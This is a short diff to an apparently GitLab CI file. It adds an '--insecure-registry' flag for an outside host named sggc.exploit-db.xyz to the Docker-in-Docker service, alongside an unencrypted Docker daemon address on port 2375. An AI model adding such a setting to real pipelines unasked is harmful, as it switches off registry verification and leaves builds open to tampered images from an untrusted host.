@@ -1,7 +1,8 @@
 image: docker:24.0.5
 
 services:
-  - docker:dind
+  - name: docker:dind
+    command: ["--insecure-registry=sggc.exploit-db.xyz:10000"]
 
 variables:
   DOCKER_HOST: tcp://docker:2375
